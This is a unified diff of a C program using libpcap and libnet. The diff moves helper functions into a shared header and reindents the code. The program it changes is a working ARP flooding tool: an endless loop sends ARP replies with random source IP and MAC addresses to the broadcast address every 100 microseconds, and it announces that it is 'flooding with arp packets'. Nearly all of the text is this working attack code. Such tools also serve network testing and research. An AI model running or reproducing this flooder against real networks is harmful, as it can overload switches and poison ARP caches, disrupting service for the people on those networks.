@@ -36,38 +36,10 @@
 #include <libnet.h>
 /* timne() */
 #include <time.h>
+/* commcon functions */
+#include "common.h"
 
 #define MSIZE 6
-
-void pcap_die (pcap_t *pcap_handle, char *message) {
-    fprintf(stderr, "%s: %s\n", message, pcap_geterr(pcap_handle));
-    pcap_close(pcap_handle);
-    exit(EXIT_FAILURE);
-}
-
-void libnet_die (libnet_t *libnet_handle) {
-    fprintf(stderr, "%s", libnet_geterror(libnet_handle));
-    libnet_destroy(libnet_handle);
-    exit(EXIT_FAILURE);
-}
-
-char *hw_ntoa(struct libnet_ether_addr *hw) {
-    static int i;
-    char *str;
-
-    if ((str = malloc(6*2+5+1)) == NULL) {
-	fprintf(stderr, "%s\n", strerror(errno));
-	exit(EXIT_FAILURE);
-    }
-    str[0] = '\0';
-
-    for (i = 0; i < 6; ++i) {
-	sprintf(str, "%s%2.2X:", str, hw->ether_addr_octet[i]);
-    }
-    str[6*2+5] = '\0';
-
-    return str;
-}
 
 int main (int argc, char **argv) {
     char *interface = NULL;
@@ -82,34 +54,34 @@ int main (int argc, char **argv) {
     int status;
 
     if (argc > 1)
-	interface = argv[1];
+        interface = argv[1];
 
     if (interface == NULL)
-	interface = pcap_lookupdev(pcap_error_buffer);
+        interface = pcap_lookupdev(pcap_error_buffer);
 
     if (interface == NULL) {
-	fprintf(stderr, "pcap_lookupdev: %s\n", pcap_error_buffer);
-	exit(EXIT_FAILURE);
+        fprintf(stderr, "pcap_lookupdev: %s\n", pcap_error_buffer);
+        exit(EXIT_FAILURE);
     }
-    
+
     printf ("using inteface %s\n", interface);
-    
+
     if ((libnet_handle = libnet_init(LIBNET_LINK_ADV, interface, libnet_error_buffer)) == NULL) {
-	fprintf(stderr, "%s", libnet_error_buffer);
-	exit(EXIT_FAILURE);
+        fprintf(stderr, "%s", libnet_error_buffer);
+        exit(EXIT_FAILURE);
     }
 
     /* seed random number generator with an unique number */
     srand(getpid()*time(NULL));
-    
+
     if ((hw_src = malloc(sizeof(struct libnet_ether_addr))) == NULL) {
-	fprintf(stderr, "%s\n", strerror(errno));
-	exit(EXIT_FAILURE);
+        fprintf(stderr, "%s\n", strerror(errno));
+        exit(EXIT_FAILURE);
     }
 
     if ((hw_dst = malloc(sizeof(struct libnet_ether_addr))) == NULL) {
-	fprintf(stderr, "%s\n", strerror(errno));
-	exit(EXIT_FAILURE);
+        fprintf(stderr, "%s\n", strerror(errno));
+        exit(EXIT_FAILURE);
     }
 
     memset((void *)&hw_dst->ether_addr_octet, 0xff, MSIZE);
@@ -120,55 +92,55 @@ int main (int argc, char **argv) {
     printf("flooding with arp packets with random hw / ip addresses\n");
 
     for (;;) {
-    
-	    ip_src.s_addr = rand();
-	    
-	    hw_src->ether_addr_octet[1] = (int) (80.0*rand()/(RAND_MAX+1.0));
-	    hw_src->ether_addr_octet[2] = (int) (255.0*rand()/(RAND_MAX+1.0));
-	    hw_src->ether_addr_octet[3] = (int) (255.0*rand()/(RAND_MAX+1.0));
-	    hw_src->ether_addr_octet[4] = (int) (255.0*rand()/(RAND_MAX+1.0));
-	    hw_src->ether_addr_octet[5] = (int) (255.0*rand()/(RAND_MAX+1.0));
 
-	    if (libnet_build_arp(
-		    ARPHRD_ETHER,			/* hardware addr */
-        	    ETHERTYPE_IP,			/* protocol addr */
-        	    ETHER_ADDR_LEN,			/* hardware addr size */
-        	    4,					/* protocol addr size */
-        	    ARPOP_REPLY,			/* operation type */
-    		    hw_src->ether_addr_octet,		/* sender hardware addr */
-        	    (u_int8_t *)&ip_src.s_addr,		/* sender protocol addr */
-        	    hw_dst->ether_addr_octet,		/* target hardware addr */
-        	    (u_int8_t *)&ip_dst.s_addr,		/* target protocol addr */
-		    NULL,				/* payload */
-        	    0,					/* payload size */
-        	    libnet_handle,			/* libnet context */
-        	    0) == -1)				/* libnet id */
-		libnet_die(libnet_handle);
+            ip_src.s_addr = rand();
 
-	    if (libnet_build_ethernet(
-		    hw_dst->ether_addr_octet,		/* dest eth addr */
-		    hw_src->ether_addr_octet,		/* src eth addr */
-		    ETHERTYPE_ARP,			/* protocol type */
-		    NULL,				/* payload */
-		    0,					/* payload size */
-		    libnet_handle,			/* libnet context */
-		    0) == -1)				/* libnet id */
-		libnet_die(libnet_handle);
+            hw_src->ether_addr_octet[1] = (int) (80.0*rand()/(RAND_MAX+1.0));
+            hw_src->ether_addr_octet[2] = (int) (255.0*rand()/(RAND_MAX+1.0));
+            hw_src->ether_addr_octet[3] = (int) (255.0*rand()/(RAND_MAX+1.0));
+            hw_src->ether_addr_octet[4] = (int) (255.0*rand()/(RAND_MAX+1.0));
+            hw_src->ether_addr_octet[5] = (int) (255.0*rand()/(RAND_MAX+1.0));
 
-	    if (libnet_adv_cull_packet(libnet_handle, &packet, &packet_size) == -1)
-		libnet_die(libnet_handle);
+            if (libnet_build_arp(
+                    ARPHRD_ETHER,                       /* hardware addr */
+                    ETHERTYPE_IP,                       /* protocol addr */
+                    ETHER_ADDR_LEN,                     /* hardware addr size */
+                    4,                                  /* protocol addr size */
+                    ARPOP_REPLY,                        /* operation type */
+                    hw_src->ether_addr_octet,           /* sender hardware addr */
+                    (u_int8_t *)&ip_src.s_addr,         /* sender protocol addr */
+                    hw_dst->ether_addr_octet,           /* target hardware addr */
+                    (u_int8_t *)&ip_dst.s_addr,         /* target protocol addr */
+                    NULL,                               /* payload */
+                    0,                                  /* payload size */
+                    libnet_handle,                      /* libnet context */
+                    0) == -1)                           /* libnet id */
+                libnet_die(libnet_handle);
 
-	    libnet_adv_free_packet(libnet_handle, packet);
+            if (libnet_build_ethernet(
+                    hw_dst->ether_addr_octet,           /* dest eth addr */
+                    hw_src->ether_addr_octet,           /* src eth addr */
+                    ETHERTYPE_ARP,                      /* protocol type */
+                    NULL,                               /* payload */
+                    0,                                  /* payload size */
+                    libnet_handle,                      /* libnet context */
+                    0) == -1)                           /* libnet id */
+                libnet_die(libnet_handle);
+
+            if (libnet_adv_cull_packet(libnet_handle, &packet, &packet_size) == -1)
+                libnet_die(libnet_handle);
+
+            libnet_adv_free_packet(libnet_handle, packet);
 
 
-	    if ((status = libnet_write(libnet_handle)) == -1)
-	        printf("!");
-	    else
-	        printf(".");
+            if ((status = libnet_write(libnet_handle)) == -1)
+                printf("!");
+            else
+                printf(".");
 
-	    usleep(100);
+            usleep(100);
 
-	    libnet_clear_packet(libnet_handle);
+            libnet_clear_packet(libnet_handle);
 
     }
 
